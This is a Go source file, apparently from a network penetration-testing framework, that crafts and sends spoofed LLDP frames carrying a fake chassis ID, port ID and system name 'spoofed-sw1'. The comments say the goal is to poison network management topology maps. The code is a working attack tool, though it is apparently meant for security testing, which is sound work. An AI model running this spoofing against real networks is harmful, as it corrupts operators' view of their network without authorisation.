// lldpspoof.go implements the generic LLDP spoofing attack behavior.
//
// Durability (from the catalog): transient-decay. The attack sends spoofed
// LLDP frames with false chassis/port/system information to poison network
// management topology maps. The spoofed entries decay after the LLDP
// holdtime (TTL) expires — no explicit teardown.
//
// The baseline does not carry a generic LLDP spoofing attack; the craft
// is spec-authored from IEEE 802.1AB.

package fh

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type lldpSpoofFinding struct {
	Action string `json:"action"`
	TTL    uint16 `json:"ttl"`
	Count  int    `json:"count"`
}

// RunLLDPSpoof sends spoofed LLDP frames with a false chassis ID, port ID,
// and system name. The in-memory test shape sends a bounded burst.
func RunLLDPSpoof(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()
	ttl := uint16(120)
	count := 2

	pkt, err := craftLLDPSpoof(src, ttl)
	if err != nil {
		return fmt.Errorf("lldpspoof: craft frame: %w", err)
	}

	for range count {
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return fmt.Errorf("lldpspoof: send frame: %w", err)
		}
	}

	detail, _ := json.Marshal(lldpSpoofFinding{
		Action: "lldp-spoof",
		TTL:    ttl,
		Count:  count,
	})
	deps.Emitter.Finding("lldp", detail)

	return nil
}

// craftLLDPSpoof builds an LLDP frame with spoofed chassis/port/TTL.
func craftLLDPSpoof(src net.HardwareAddr, ttl uint16) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       lldpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeLinkLayerDiscovery,
	}
	lldp := &layers.LinkLayerDiscovery{
		ChassisID: layers.LLDPChassisID{
			Subtype: layers.LLDPChassisIDSubTypeMACAddr,
			ID:      src,
		},
		PortID: layers.LLDPPortID{
			Subtype: layers.LLDPPortIDSubtypeIfaceName,
			ID:      []byte("Gi0/1"),
		},
		TTL: ttl,
		Values: []layers.LinkLayerDiscoveryValue{
			{
				Type:   layers.LLDPTLVSysName,
				Length: 11,
				Value:  []byte("spoofed-sw1"),
			},
			{
				Type:   layers.LLDPTLVSysCapabilities,
				Length: 4,
				Value:  []byte{0x00, 0x14, 0x00, 0x14}, // router + bridge
			},
		},
	}
	return craft.Default(eth, lldp)
}
